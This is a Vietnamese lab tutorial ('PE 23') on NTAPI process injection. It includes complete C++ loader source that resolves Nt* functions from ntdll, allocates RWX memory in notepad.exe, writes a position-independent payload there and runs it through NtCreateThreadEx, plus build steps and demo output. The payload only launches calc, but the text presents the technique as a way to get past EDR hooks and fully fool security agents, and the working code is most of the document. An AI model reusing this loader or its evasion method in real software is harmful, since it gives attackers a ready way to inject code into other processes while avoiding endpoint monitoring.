
---

# 📝 [PE 23] NTAPI Injection (Direct Native API Execution)

## 📌 1. Tổng Quan Kỹ Thuật (Overview)

**NTAPI Injection** (Native API Injection) là giải thuật né tránh phòng thủ động chuyên sâu, tập trung đánh lừa các cơ chế giám sát dựa trên tầng Win32 Subsystem bọc ngoài của các giải pháp AV/EDR hiện đại.

Mọi chương trình Windows thông thường khi muốn can thiệp bộ nhớ chéo tiến trình đều đi qua các hàm Win32 API tài liệu hóa (Documented APIs). Tuy nhiên, đây lại là "tử huyệt" bảo mật vì các EDR luôn ưu tiên đặt Hook dày đặc tại đây.

Lab PE 23 hóa giải bài toán này bằng cách **gạt bỏ hoàn toàn việc triệu hồi Win32 API nhạy cảm**. Loader sử dụng con trỏ hàm động để triệu hồi trực tiếp các System Call bọc ngoài của `ntdll.dll` (nhóm hàm mang tiền tố `Nt/Zw`). Dòng chảy dữ liệu đi thẳng từ Loader xuống lõi nhân Kernel thông qua cổng Native, bẻ gãy hoàn toàn các cảm biến an ninh đặt tại tầng Win32 Subsystem.

### 🎯 Mục tiêu nghiên cứu:

* Vô hiệu hóa 100% các bộ lọc và bẫy Hook đặt tại tầng Win32 API (`kernel32.dll` / `KernelBase.dll`).
* Làm chủ kỹ nghệ phân giải động và ánh xạ tham số đặc thù của các hàm Native API (`NTSTATUS` Return Type).
* Áp dụng quy trình cấp phát động thích ứng đường dẫn hệ thống để loại bỏ hoàn toàn các chuỗi gán cứng lỗi thời.

---

## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)

Trong kiến trúc phân lớp của Windows OS, lớp Win32 chỉ là một lớp thông dịch (Wrapper). Khi bạn gọi `VirtualAllocEx`, mã nguồn inside của Microsoft thực chất sẽ chuyển đổi tham số và gọi xuống `NtAllocateVirtualMemory` của `ntdll.dll` trước khi chuyển giao cho CPU thực hiện lệnh Syscall hạ tầng xuống Kernel.

Quy trình toán học giải phẫu và chọc thủng phân hệ bọc ngoài của Lab PE 23 diễn ra qua 4 bước ngầm sau:

```
[GetModuleHandle: Trỏ ntdll] ──> [GetProcAddress: Phân giải NtAPI] ──> [NtAllocateVirtualMemory: Mở RAM từ xa] ──> [NtWriteVirtualMemory: Đổ Payload] ──> [NtCreateThreadEx: Khai hỏa]

```

1. **Bóc tách con trỏ Native ngầm**: Loader sử dụng cặp bài trùng `GetModuleHandleA` và `GetProcAddress` trỏ vào `ntdll.dll` để bốc tách địa chỉ sống trên RAM của các hàm thô: `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, và `NtCreateThreadEx`.
2. **Cấp phát bộ nhớ tầng thấp (`NtAllocateVirtualMemory`)**: Thay vì nhận các tham số đơn giản, hàm Native yêu cầu truyền địa chỉ trang nhớ dưới dạng con trỏ của con trỏ (`PVOID* BaseAddress`) và kích thước vùng nhớ dạng tham chiếu (`PSIZE_T RegionSize`). Kernel sẽ trực tiếp xử lý phân vùng mang cờ **`PAGE_EXECUTE_READWRITE` (RWX)** chéo tiến trình mục tiêu.
3. **Bơm máu trực tiếp chéo tiến trình (`NtWriteVirtualMemory`)**: Đổ dữ liệu cấu trúc tham số tuyệt đối toán học và khối mã máy PIC trực tiếp sang RAM đối phương thông qua handle tiến trình, không để lại bất kỳ gợn nhật ký Win32 nào.
4. **Kích nổ luồng Native (`NtCreateThreadEx`)**: Hàm tối cao này tạo luồng từ xa mà không cần thông qua sự kiểm duyệt của phân hệ Win32 Subsystem, ép CPU của nạn nhân tự động rút lệnh thực thi Payload của ta.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Cấp phát động Thích ứng (Zero Static Buffers)** và xử lý mã lỗi hệ thống `NTSTATUS` chuẩn chỉ kịch trần.

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa các cấu trúc dữ liệu và nguyên mẫu con trỏ hàm đặc thù của Native API
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect
);

typedef NTSTATUS(NTAPI* pNtWriteProcessMemory)(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN LPCVOID Buffer,
    IN SIZE_T BufferSize,
    OUT PSIZE_T NumberOfBytesWritten OPTIONAL
);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
);

typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm chức năng độc lập vị trí (PIC) gánh luồng chạy khi tiêm chéo tiến trình
DWORD WINAPI RemoteNativePayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID linh hoạt, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) { processID = pe32.th32ProcessID; break; }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);   return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 23: DIRECT NATIVE API (NTAPI) INJECTION FLAT" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);
    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad nhen." << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return EXIT_FAILURE;

    // Phân giải động các cổng Native API trực tiếp từ ntdll.dll để bypass Win32 bọc ngoài
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtWriteProcessMemory NtWriteVirtualMemory = (pNtWriteProcessMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtCreateThreadEx) {
        std::cerr << "[-] Khong the phan giai he thong Native APIs thô!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da bat dong bo va anh xa thanh cong thap ham NTAPI." << std::endl;

    // ─── BƯỚC 1: NTALLOCATEVIRTUALMEMORY - CẤP PHÁT BỘ NHỚ TẦNG THẤP TỪ XA ───
    PVOID remoteCodeBuffer = NULL;
    SIZE_T codeSize = 500; // Áp dụng Quy trình cấp phát động Thích ứng
    
    NTSTATUS status = NtAllocateVirtualMemory(hProcess, &remoteCodeBuffer, 0, &codeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    PVOID remoteDataBuffer = NULL;
    SIZE_T dataSize = sizeof(THREAD_DATA);
    status |= NtAllocateVirtualMemory(hProcess, &remoteDataBuffer, 0, &dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (status != 0 || !remoteCodeBuffer || !remoteDataBuffer) {
        std::cerr << "[-] NtAllocateVirtualMemory failed! STATUS: 0x" << std::hex << status << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Cap phat trang thuc thi qua NTAPI tai RAM: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Khởi tạo cấu trúc dữ liệu con trỏ tuyệt đối cục bộ
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // ─── BƯỚC 2: NTWRITEVIRTUALMEMORY - BƠM MÃ MÁY VÀ DỮ LIỆU CHÉO RAM ───
    status = NtWriteVirtualMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemoteNativePayload, 500, NULL);
    status |= NtWriteVirtualMemory(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), NULL);

    if (status != 0) {
        std::cerr << "[-] NtWriteVirtualMemory that bai!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Nap ma may va tham so tuyet doi vao xac Notepad hoan tat." << std::endl;

    // ─── BƯỚC 3: NTCREATETHREADEX - KÍCH NỔ LUỒNG NATIVE TỪ XA ───
    std::cout << "[*] Dang dung NtCreateThreadEx de sinh luong ngam tu xa..." << std::endl;
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteCodeBuffer, remoteDataBuffer, 0, 0, 0, 0, NULL);

    if (status == 0 && hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE); // Gánh luồng xử lý dứt điểm phẳng sạch
        std::cout << "[+] NTAPI Direct Injection Process Executed Successfully!" << std::endl;
        CloseHandle(hThread);
    } else {
        std::cerr << "[-] NtCreateThreadEx that bai! NTSTATUS: 0x" << std::hex << status << std::endl;
    }

    // Đóng handle bảo an hệ thống triệt để chống Memory Leak
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh quy trinh NTAPI. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)

### ⚙️ Thiết lập trên Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
2. Đi tới mục cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng `Runtime Library`, chuyển cấu hình sang cờ **`Multi-threaded (/MT)`** để liên kết tĩnh toàn bộ thư viện hệ thống chạy mượt mà độc lập trên máy ảo VM sạch.
3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân sạch bóng.

---

## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)

Bật sẵn ứng dụng `Notepad.exe` trên máy Lab, mở PowerShell ngoài đĩa thô và chạy file nhị phân:

```powershell
PS C:\Workspace\x64\Release> .\PE23_NTAPI_Injection.exe
====================================================
[*] PE 23: DIRECT NATIVE API (NTAPI) INJECTION FLAT
====================================================
[+] Da tim thay Notepad.exe voi PID: 12588
[+] Da bat dong bo va anh xa thanh cong thap ham NTAPI.
[+] Cap phat trang thuc thi qua NTAPI tai RAM: 0x000001FA8C7F0000
[+] Nap ma may va tham so tuyet doi vao xac Notepad hoan tat.
[*] Dang dung NtCreateThreadEx de sinh luong ngam tu xa...
[+] NTAPI Direct Injection Process Executed Successfully!

[*] Hoan thanh quy trinh NTAPI. Nhan Enter de dong cua so...

```

*🎯 Hệ quả RAM tối cao:*
Ứng dụng Máy tính `calc.exe` bật bung hiên ngang tại runtime rực rỡ kịch trần kịch khung! Chiến dịch chọc thủng phân hệ bọc ngoài gặt hái thành công mỹ mãn. Vì Loader hoàn toàn bypass các API phổ thông của lớp Win32 Subsystem, các bộ giám sát hành vi bọc ngoài của Security Agents đều bị qua mặt một cách hoàn toàn sạch bóng!

---

